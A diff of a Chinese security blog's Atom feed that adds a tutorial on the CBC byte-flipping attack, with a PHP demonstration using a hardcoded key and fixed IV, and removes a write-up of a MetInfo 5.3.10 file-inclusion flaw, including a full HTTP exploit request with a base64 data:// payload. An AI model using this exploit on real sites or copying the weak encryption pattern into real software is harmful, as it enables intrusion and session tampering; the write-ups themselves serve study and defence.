@@ -5,7 +5,7 @@
   <link href="/atom.xml" rel="self"/>
   
   <link href="http://yoursite.com/"/>
-  <updated>2017-04-09T05:25:11.525Z</updated>
+  <updated>2017-04-24T06:25:56.378Z</updated>
   <id>http://yoursite.com/</id>
   
   <author>
@@ -14,6 +14,68 @@
   </author>
   
   <generator uri="http://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>CBC字节翻转攻击</title>
+    <link href="http://yoursite.com/CTF/2017/04/24/CBC%E5%AD%97%E8%8A%82%E7%BF%BB%E8%BD%AC%E6%94%BB%E5%87%BB.html"/>
+    <id>http://yoursite.com/CTF/2017/04/24/CBC字节翻转攻击.html</id>
+    <published>2017-04-24T01:51:18.000Z</published>
+    <updated>2017-04-24T06:25:56.378Z</updated>
+    
+    <content type="html"><![CDATA[<h3 id="0x01-CBC翻转技术"><a href="#0x01-CBC翻转技术" class="headerlink" title="0x01 CBC翻转技术"></a>0x01 CBC翻转技术</h3><p>　　<a href="https://en.wikipedia.org/wiki/Block_cipher_mode_of_operation" target="_blank" rel="external">CBC</a>模式的全称是密文分组链接模式（Cipher Block Chainning)，之所以叫这个名字，是因为密文分组是像链条一样相互连接在一起的。<br><img src="http://i2.muimg.com/567571/0b694168b633add3.png" alt=""><br>　　在CBC模式中，首先将明文分组与前一个密文分组进行XOR运算，然后再进行加密，当加密第一个明文分组时，由于不存在“前一个密文分组”，因此需要事先准备一个长度为一个分组的比特序列来代替“前一个密文分组”，这个比特序列称为初始化向量（Initialization vector),通常缩写为IV,如果每次都使用相同的初始化向量（IV），当用同一密钥对同一明文进行加密时，所得到的密码一定是相同的，所以每次加密时都会随机产生一个不同的比特序列来作为初始化向量，避免这种情况产生。即：<a id="more"></a><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">首先将明文分组(常见的以16字节为一组)，位数不足的使用特殊字符填充。</div><div class="line">生成一个随机的初始化向量(IV)和一个密钥。</div><div class="line">将IV和第一组明文异或。</div><div class="line">用密钥对3中xor后产生的密文加密。</div><div class="line">用4中产生的密文对第二组明文进行xor操作。</div><div class="line">用密钥对5中产生的密文加密。</div><div class="line">重复4-7，到最后一组明文。</div><div class="line">将IV和加密后的密文拼接在一起，得到最终的密文。</div></pre></td></tr></table></figure></p>
+<p>加密公式：</p>
+<ul>
+<li><p>Ciphertext-0 = Encrypt(Plaintext XOR IV) —只用于第一个组块</p>
+</li>
+<li><p>Ciphertext-N = Encrypt(Plaintext XOR Ciphertext-N-1) —用于第二及剩下的组块<br>　　<br><img src="http://i2.muimg.com/567571/f24e769a0be02a4c.png" alt=""></p>
+</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">从密文中提取出IV，然后将密文分组。</div><div class="line">使用密钥对第一组的密文解密，然后和IV进行xor得到明文。</div><div class="line">使用密钥对第二组密文解密，然后和2中的密文xor得到明文。</div><div class="line">重复2-3，直到最后一组密文。</div></pre></td></tr></table></figure>
+<p>解密公式：</p>
+<ul>
+<li><p>Plaintext-0 = Decrypt(Ciphertext) XOR IV—只用于第一个组块</p>
+</li>
+<li><p>laintext-N = Decrypt(Ciphertext) XOR Ciphertext-N-1—用于第二及剩下的组块</p>
+</li>
+</ul>
+<h3 id="0x02-翻转攻击"><a href="#0x02-翻转攻击" class="headerlink" title="0x02 翻转攻击"></a>0x02 翻转攻击</h3><p>　　<strong>可以注意到Ciphertext-N-1用来产生下一块明文</strong>，这就是字节翻转攻击开始发挥作用的地方，如果我们改变Ciphertext-N-1中的一个字节，然后和下一块解密后的密文xor，就可以得到一个不同的明文，而这个明文是我们可以控制的。利用这一点，我们就欺骗服务端或者绕过过滤器。<br>　　CBC比特反转攻击的目的是攻击者通过修改密文来操纵解密后的明文，攻击者会对初始化向量（IV）中的任意比特位进行反转（1变0，0变1），则明文分组（解密后得到的明文分组）中相应的比特也会被反转。比如一个叫admin的用户，登录，经过CBC模式加密后，token为”aaabbbccc999”,现在有一个攻击者，叫john，登录，经过CBC模式加密后，token为cccbbbccc1111,现在john将token改为”ffcbbbccc1111”，发现登录名变成了ohn，所以他知道token第一个位的ff转换成了，经过几轮测试，他发现如果将token改为“7bcbbbccc1111”，则登录名变成了’aohn’，最后他通过发送token为7bdc995465到服务器，发现自己已经变成了admin。</p>
+<p><img src="http://i4.buimg.com/567571/72106305bef82c9d.jpg" alt=""></p>
+<p>　　根据解密流程，我们假设A为密文经过AES解密后的字串，B为前一组密文，C为明文：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">A = Decrypt(Ciphertext)[0] = 6</div><div class="line">B = (Ciphertext-N-1)[0] = 13</div><div class="line">C = Plaintext[0] = 11</div></pre></td></tr></table></figure></p>
+<p>　　那么经过解密过程可知：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">C = A xor B</div></pre></td></tr></table></figure></p>
+<p>　　那么<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">A xor B xor C = 0 (任何数与自己异或都为0)</div></pre></td></tr></table></figure></p>
+<p>　　由于任何数与0异或都为自己本身，则<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">A xor B xor C xor 3 = 3</div></pre></td></tr></table></figure></p>
+<p>　　那么此时我们可以这样来看<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">A = A = 6</div><div class="line">B = B xor 3 = 13 xor 3 xor 11 = 5</div><div class="line">C = C = 11</div></pre></td></tr></table></figure></p>
+<p>　　现在我们修改密文对应的位让B = 5，那么当密文解密后，会发现，明文C会变成3，通过这种方法我们可以控制任何一位明文。</p>
+<h3 id="0x03-实例说明"><a href="#0x03-实例说明" class="headerlink" title="0x03 实例说明"></a>0x03 实例说明</h3><p>　　我们举例说明一下这个例子，这里有一个明文序列：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">a:2:&#123;s:4:&quot;name&quot;;s:6:&quot;sdsdsd&quot;;s:8:&quot;greeting&quot;;s:20:&quot;echo &apos;Hello sdsdsd!&apos;&quot;;&#125;</div></pre></td></tr></table></figure></p>
+<p>　　我们的目标是将“s:6”当中的数字6转换成数字“7”。我们需要做的第一件事就是把明文分成16个字节的块：</p>
+<ul>
+<li>Block 1:a:2:{s:4:”name”;</li>
+<li>Block 2:s:6:”sdsdsd”;s:8</li>
+<li>Block 3::”greeting”;s:20</li>
+<li>Block 4::”echo ‘Hello sd</li>
+<li>Block 5:sdsd!’”;}</li>
+</ul>
+<p>　　我们需要更改的字符位于<strong>块２</strong>，因此我们需要改变<strong>块1</strong>的密文来改变<strong>块2</strong>的明文。在密文中改变的字节，只会影响到在下一明文当中，具有相同偏移量的字节。<br>　　因此我们只需要改变在第一个密文块当中，偏移量是2的字节。在第2行我们得到了整个数据的密文，然后在第3行中，我们改变块1中偏移量为2的字节，最后我们再调用解密函数。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">$v = &quot;a:2:&#123;s:4:&quot;name&quot;;s:6:&quot;sdsdsd&quot;;s:8:&quot;greeting&quot;;s:20:&quot;echo &apos;Hello sdsdsd!&apos;&quot;;&#125;&quot;;</div><div class="line">$enc = @encrypt($v);</div><div class="line">$enc[2] = chr(ord($enc[2]) ^ ord(&quot;6&quot;) ^ ord (&quot;7&quot;));</div><div class="line">$b = @decrypt($enc);</div></pre></td></tr></table></figure>
+<p><img src="http://i2.muimg.com/567571/1ba83675efa713e6.png" alt=""><br>　　这样我们就把“s:6”当中的数字6转换成数字“7”，达到来了我们想要的目的。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div></pre></td><td class="code"><pre><div class="line">&lt;?php</div><div class="line">define(&apos;MY_AES_KEY&apos;, &quot;abcdef0123456789&quot;);</div><div class="line">function aes($data, $encrypt) &#123;</div><div class="line">    $aes = mcrypt_module_open(MCRYPT_RIJNDAEL_128, &apos;&apos;, MCRYPT_MODE_CBC, &apos;&apos;);</div><div class="line">    $iv = &quot;1234567891234567&quot;;</div><div class="line">    mcrypt_generic_init($aes, MY_AES_KEY, $iv);</div><div class="line">    return $encrypt ? mcrypt_generic($aes,$data) : mdecrypt_generic($aes,$data);</div><div class="line">&#125;</div><div class="line"></div><div class="line">define(&apos;MY_MAC_LEN&apos;, 40);</div><div class="line"></div><div class="line">function encrypt($data) &#123;</div><div class="line">    return aes($data, true);</div><div class="line">&#125;</div><div class="line"></div><div class="line">function decrypt($data) &#123;</div><div class="line">    $data = rtrim(aes($data, false), &quot;\0&quot;);ss</div><div class="line">    return $data;</div><div class="line">&#125;</div><div class="line">$v = &quot;a:2:&#123;s:4:\&quot;name\&quot;;s:6:\&quot;sdsdsd\&quot;;s:8:\&quot;greeting\&quot;;s:20:\&quot;echo &apos;Hello sdsdsd!&apos;\&quot;;&#125;&quot;;</div><div class="line">echo &quot;Plaintext before attack: $v\n&quot;;</div><div class="line">$b = array();</div><div class="line">$enc = array();</div><div class="line">$enc = @encrypt($v);</div><div class="line">$enc[2] =  chr(ord($enc[2]) ^ ord(&quot;6&quot;) ^ ord (&quot;7&quot;));</div><div class="line">$b = @decrypt($enc);</div><div class="line">echo &quot;Plaintext AFTER attack : $b\n&quot;;</div><div class="line">?&gt;</div></pre></td></tr></table></figure>
+<p>参考链接：<br><a href="http://drops.wooyun.org/tips/4975" target="_blank" rel="external">使用CBC比特反转攻击绕过加密的会话令牌</a><br><a href="http://zke1ev3n.me/2015/12/15/CBC%E5%AD%97%E8%8A%82%E5%8F%8D%E8%BD%AC%E6%94%BB%E5%87%BB/" target="_blank" rel="external">CBC字节反转攻击</a></p>
+]]></content>
+    
+    <summary type="html">
+    
+      &lt;h3 id=&quot;0x01-CBC翻转技术&quot;&gt;&lt;a href=&quot;#0x01-CBC翻转技术&quot; class=&quot;headerlink&quot; title=&quot;0x01 CBC翻转技术&quot;&gt;&lt;/a&gt;0x01 CBC翻转技术&lt;/h3&gt;&lt;p&gt;　　&lt;a href=&quot;https://en.wikipedia.org/wiki/Block_cipher_mode_of_operation&quot;&gt;CBC&lt;/a&gt;模式的全称是密文分组链接模式（Cipher Block Chainning)，之所以叫这个名字，是因为密文分组是像链条一样相互连接在一起的。&lt;br&gt;&lt;img src=&quot;http://i2.muimg.com/567571/0b694168b633add3.png&quot; alt=&quot;&quot;&gt;&lt;br&gt;　　在CBC模式中，首先将明文分组与前一个密文分组进行XOR运算，然后再进行加密，当加密第一个明文分组时，由于不存在“前一个密文分组”，因此需要事先准备一个长度为一个分组的比特序列来代替“前一个密文分组”，这个比特序列称为初始化向量（Initialization vector),通常缩写为IV,如果每次都使用相同的初始化向量（IV），当用同一密钥对同一明文进行加密时，所得到的密码一定是相同的，所以每次加密时都会随机产生一个不同的比特序列来作为初始化向量，避免这种情况产生。即：
+    
+    </summary>
+    
+      <category term="CTF" scheme="http://yoursite.com/categories/CTF/"/>
+    
+    
+      <category term="CTF" scheme="http://yoursite.com/tags/CTF/"/>
+    
+      <category term="密码学" scheme="http://yoursite.com/tags/%E5%AF%86%E7%A0%81%E5%AD%A6/"/>
+    
+  </entry>
   
   <entry>
     <title>PHP伪协议</title>
@@ -638,7 +700,7 @@ popen(&apos;whoami&apos; &gt;&gt;D:/test.txt&apos;,&apos;r&apos;);
     <link href="http://yoursite.com/CTF/2017/03/02/CTF%E4%B8%AD%E7%9A%84CRYPTO.html"/>
     <id>http://yoursite.com/CTF/2017/03/02/CTF中的CRYPTO.html</id>
     <published>2017-03-02T11:29:28.000Z</published>
-    <updated>2017-04-03T13:37:05.567Z</updated>
+    <updated>2017-04-24T01:53:35.641Z</updated>
     
     <content type="html"><![CDATA[<h3 id="0x01-CRC32碰撞"><a href="#0x01-CRC32碰撞" class="headerlink" title="0x01 CRC32碰撞"></a>0x01 CRC32碰撞</h3><h4 id="0x01-CRC32"><a href="#0x01-CRC32" class="headerlink" title="0x01 CRC32"></a>0x01 CRC32</h4><p>CRC全称为Cyclic redundancy check，即循环冗余校验码，是一种根据输入数据产生简短的固定位数校验码的散列函数。CRC主要用来检测或者校验数据经过传输或者保存后可能出现的错误，CRC32产生32位的散列值（即4字节）。<br>CRC32可以用于数据的校验，在WinRAR等压缩软件中也使用了这一技术，压缩包中每个文件都保存有一个对应的CRC32值，这个值是对压缩前的文件数据计算出来的散列值，在进行解压时会再次计算文件的CRC32值来进行对比，判断压缩包文件是否损坏。<a id="more"></a><br>尽管CRC32在错误检测中非常有用，但是并不能可靠地校验数据完整性（即数据没有发生任何变化），这是因为CRC多项式是线性结构，可以非常容易地故意改变数据而维持CRC不变，即存在产生碰撞的可能性。</p>
 <h4 id="0x02-CRC32计算"><a href="#0x02-CRC32计算" class="headerlink" title="0x02 CRC32计算"></a>0x02 CRC32计算</h4><p>为了快速方便的还原压缩包的内容，我们需要编程来计算CRC32的值。计算CRC32可以有多种方法，可以从网上找一个实现好的C/C++源文件，也可以使用Python提供的库函数来进行计算，这里我们选择后者。<br>Python的binascii模块提供了一个crc32方法，可以方便的计算所给参数的CRC32值。但是这里的计算结果有一点问题，因为计算出来的结果是一个有符号数，所以可能会看到结果为负数，因此需要将结果和0xFFFFFFFF进行一个位运算与操作。Python计算CRC32的代码如下：</p>
@@ -831,6 +893,8 @@ print c
     
     
       <category term="CTF" scheme="http://yoursite.com/tags/CTF/"/>
+    
+      <category term="密码学" scheme="http://yoursite.com/tags/%E5%AF%86%E7%A0%81%E5%AD%A6/"/>
     
   </entry>
   
@@ -1975,9 +2039,9 @@ echo &quot;false!&quot;;
       <category term="漏洞" scheme="http://yoursite.com/categories/%E6%BC%8F%E6%B4%9E/"/>
     
     
-      <category term="php" scheme="http://yoursite.com/tags/php/"/>
-    
       <category term="渗透测试" scheme="http://yoursite.com/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
+    
+      <category term="php" scheme="http://yoursite.com/tags/php/"/>
     
   </entry>
   
@@ -2093,108 +2157,6 @@ if __name__ == &quot;__main__&quot;:
       <category term="python" scheme="http://yoursite.com/tags/python/"/>
     
       <category term="web前端" scheme="http://yoursite.com/tags/web%E5%89%8D%E7%AB%AF/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>Metinfo5.3.10 CMS 命令执行 文件包含</title>
-    <link href="http://yoursite.com/%E5%AE%A1%E8%AE%A1/2016/11/27/Metinfo5-3-10-CMS-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB.html"/>
-    <id>http://yoursite.com/审计/2016/11/27/Metinfo5-3-10-CMS-命令执行-文件包含.html</id>
-    <published>2016-11-27T14:55:21.000Z</published>
-    <updated>2017-04-02T07:29:43.674Z</updated>
-    
-    <content type="html"><![CDATA[<h3 id="0x00-MetInfo"><a href="#0x00-MetInfo" class="headerlink" title="0x00 MetInfo"></a>0x00 MetInfo</h3><p>MetInfo采用PHP+Mysql架构,是一款对SEO非常友好、功能全面、安全稳定、支持多终端展示并且使用起来极其简单的企业建站系统。</p>
-<h3 id="0x01-命令执行-文件包含"><a href="#0x01-命令执行-文件包含" class="headerlink" title="0x01 命令执行 文件包含"></a>0x01 命令执行 文件包含</h3><p><strong>命令执行：</strong>应用有时需要调用一些执行系统命令的函数，如PHP中的system、exec、shell_exec、<br>passthru、popen、proc_popen等，当用户能控制这些函数中的参数时，就可以将恶意系统命令<br>拼接到正常命令中，从而造成命令执行攻击，这就是命令执行漏洞。<br><a id="more"></a><br><strong>文件包含：</strong>由于程序员未对用户可控的变量进行输入检查，导致用户可以控制被包含的文件，成功利用时可以使web server会将特定文件当成php执行，从而导致用户可获取一定的服务器权限。</p>
-<p>此次产生漏洞的版本号为Metinfo5.3.10，源码大家可以下载。</p>
-<h3 id="0x02-漏洞分析"><a href="#0x02-漏洞分析" class="headerlink" title="0x02 漏洞分析"></a>0x02 漏洞分析</h3><p>文件admin/login/login_check.php：26行</p>
-<pre><code>f($action==&quot;login&quot;){
-   $metinfo_admin_name     = $login_name;
-   $metinfo_admin_pass     = $login_pass;
-   $metinfo_admin_pass=md5($metinfo_admin_pass);
-   /*code*/
-   if($met_login_code==1){
-      require_once $depth.&apos;../include/captcha.class.php&apos;;
-      $Captcha= new  Captcha();
-      if(!$Captcha-&gt;CheckCode($code)){
-     echo(&quot;&lt;script type=&apos;text/javascript&apos;&gt;alert(&apos;$lang_logincodeerror&apos;);location.href=&apos;login.php?langset=$langset&apos;;&lt;/script&gt;&quot;);
-     exit;
-  }
-</code></pre><p>   }</p>
-<p>登录检测的，当后台开启登录校验码的时候$met_login_code会设置为1，然后require_once 去包含校验码登录文件。只要我们控制了变量$depth就可以进行远程文件包含了。</p>
-<p>而$depth变量是在文件’admin/login/login_check.php’开头定义的。</p>
-<pre><code>error_reporting(E_ERROR | E_WARNING | E_PARSE);
-if($depth!=&apos;&apos;&amp;&amp;$depth!=&apos;../&apos;&amp;&amp;$depth!=&apos;../../&apos;){die();}
-if(!isset($depth))$depth=&apos;&apos;;
-$commonpath=$depth.&apos;include/common.inc.php&apos;;
-$commonpath=$admin_index?$commonpath:&apos;../&apos;.$commonpath;
-define(&apos;SQL_DETECT&apos;,1);
-</code></pre><p>通过第一次拼接$depth包含了include/common.inc.php，前面几步可能没什么问题，这一步也没有问题的，包含了文件common.inc.php之后，但是common.inc.php中可以通过以下代码进行变量覆盖。</p>
-<p>文件：include/common.inc.php：35</p>
-<pre><code>foreach(array(&apos;_COOKIE&apos;, &apos;_POST&apos;, &apos;_GET&apos;) as $_request) {    // 遍历数组
-
-// $$_request分别是$_COOKIE, $_POST, $_GET，对应http请求提交过来的相应数据
-    foreach($$_request as $_key =&gt; $_value) {           // 分别遍历该数据
-
-        $_key{0} != &apos;_&apos; &amp;&amp; $$_key = daddslashes($_value,0,0,1);     // 对数据中的值进行转义
-        $_M[&apos;form&apos;][$_key] = daddslashes($_value,0,0,1);
-    }
-}
-</code></pre><p>对页面提交过来的数据，包括cookie，post, get三种数据进行转义。</p>
-<p>但是此处却存在一个变量覆盖漏洞，这里我们简单本地演示一下：</p>
-<pre><code>&lt;?php
-
-$a=&apos;hello&apos;;
-foreach($_GET as $key =&gt; $value){
-$$key = $value;
-}
-print $a;
-?&gt;
-</code></pre><p><img src="http://i1.piimg.com/567571/d5b5e87512c79439.png" alt=""> </p>
-<p>当我们get提交一个a值时，它会覆盖掉以前所定义，产生变量覆盖<br><img src="http://i1.piimg.com/567571/4b634cadfa654e5f.png" alt=""></p>
-<h3 id="0x03-漏洞利用"><a href="#0x03-漏洞利用" class="headerlink" title="0x03 漏洞利用"></a>0x03 漏洞利用</h3><p>我们可以利用变量覆盖漏洞覆盖掉变量$deph。</p>
-<p>本地文件包含用require_once来执行代码，但是</p>
-<pre><code>if($depth!=&apos;&apos;&amp;&amp;$depth!=&apos;../&apos;&amp;&amp;$depth!=&apos;../../&apos;){die();}
-</code></pre><p>对depth进行了过滤，我们可以使用php的封装协议data://配合require_once来进行恶意代码执行。<br>还有一个问题</p>
-<pre><code>require_once $depth.&apos;../include/captcha.class.php&apos;;
-</code></pre><p>这一串拼接在字符后面的字符串的干扰，这一段会干扰我们想要执行的代码。</p>
-<p>用base64解码正常文字会让后面这一串字符变成乱码，并且加上了单行注释符号注释掉乱码。</p>
-<p>封装器解码之后代码的样子</p>
-<p>&lt;?php phpinfo();exit();// ..þ)Üç^ýÆ©µÈZ.rV¬s.php</p>
-<p>这样我们构造exp进行测试，前提后台开启了登录验证码：</p>
-<pre><code>POST /MetInfo_5.3.10/admin/login/login_check.php?langset=cn&amp;depth=data://text/plain;base64,PD9waHAgcGhwaW5mbygpO2V4aXQoKTsvLw== HTTP/1.1
-Host: 127.0.0.1
-Content-Length: 83
-Cache-Control: max-age=0
-Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
-Origin: http://127.0.0.1
-Upgrade-Insecure-Requests: 1
-User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.101 Safari/537.36
-Content-Type: application/x-www-form-urlencoded
-Referer: http://127.0.0.1/MetInfo_5.3.10/admin/login/login.php
-Accept-Encoding: gzip, deflate
-Accept-Language: zh-CN,zh;q=0.8
-Cookie: _ga=GA1.1.1522517218.1476456267; tablepage_json=0%7Csystem%2Cnews%2Cdonews_info; ft127001=0; recordurl=%2Chttp%253A%252F%252F127.0.0.1%252FMetInfo_5.3.10%252F%2Chttp%253A%252F%252F127.0.0.1%252FMetInfo_5.3.10%252Findex.php%253Flang%253Dcn%2Chttp%253A%252F%252F127.0.0.1%252FMetInfo_5.3.10%252Findex.php%253Flang%253Dcn%2Chttp%253A%252F%252F127.0.0.1%252FMetInfo_5.3.10%252Findex.php%253Flang%253Dcn%2Chttp%253A%252F%252F127.0.0.1%252FMetInfo_5.3.10%252Findex.php%253Flang%253Dcn%2Chttp%253A%252F%252F127.0.0.1%252FMetInfo_5.3.10%252F%2Chttp%253A%252F%252F127.0.0.1%252FMetInfo_5.3.10%252F%2Chttp%253A%252F%252F127.0.0.1%252FMetInfo_5.3.10%252F%2Chttp%253A%252F%252F127.0.0.1%252FMetInfo_5.3.10%252F%2Chttp%253A%252F%252F127.0.0.1%252FMetInfo_5.3.10%252Findex.php%253Flang%253Dcn; re_url=http%3A%2F%2F127.0.0.1%2FMetInfo_5.3.10%2Fadmin%2F; met_capcha=1f1ezzrSrlMNL9bl5TC1%2F2CBMinv2dvD8CX74vlrMRbq
-Connection: close
-
-action=login&amp;login_name=admin&amp;login_pass=123456&amp;code=8CAA&amp;Submit=%E7%99%BB%E5%BD%95
-</code></pre><p>执行了phpinfo()<br><img src="http://p1.bpimg.com/567571/029868dcb218554d.png" alt=""></p>
-<p>因为使用了data://，所以需要php.ini 中allow_url_include ＝on</p>
-<h3 id="0x04、漏洞修复"><a href="#0x04、漏洞修复" class="headerlink" title="0x04、漏洞修复"></a>0x04、漏洞修复</h3><p>包含include/common.inc.php再次给$depth赋值，防止变量被污染</p>
-]]></content>
-    
-    <summary type="html">
-    
-      &lt;h3 id=&quot;0x00-MetInfo&quot;&gt;&lt;a href=&quot;#0x00-MetInfo&quot; class=&quot;headerlink&quot; title=&quot;0x00 MetInfo&quot;&gt;&lt;/a&gt;0x00 MetInfo&lt;/h3&gt;&lt;p&gt;MetInfo采用PHP+Mysql架构,是一款对SEO非常友好、功能全面、安全稳定、支持多终端展示并且使用起来极其简单的企业建站系统。&lt;/p&gt;
-&lt;h3 id=&quot;0x01-命令执行-文件包含&quot;&gt;&lt;a href=&quot;#0x01-命令执行-文件包含&quot; class=&quot;headerlink&quot; title=&quot;0x01 命令执行 文件包含&quot;&gt;&lt;/a&gt;0x01 命令执行 文件包含&lt;/h3&gt;&lt;p&gt;&lt;strong&gt;命令执行：&lt;/strong&gt;应用有时需要调用一些执行系统命令的函数，如PHP中的system、exec、shell_exec、&lt;br&gt;passthru、popen、proc_popen等，当用户能控制这些函数中的参数时，就可以将恶意系统命令&lt;br&gt;拼接到正常命令中，从而造成命令执行攻击，这就是命令执行漏洞。&lt;br&gt;
-    
-    </summary>
-    
-      <category term="审计" scheme="http://yoursite.com/categories/%E5%AE%A1%E8%AE%A1/"/>
-    
-    
-      <category term="php" scheme="http://yoursite.com/tags/php/"/>
-    
-      <category term="代码审计" scheme="http://yoursite.com/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
     
   </entry>
   
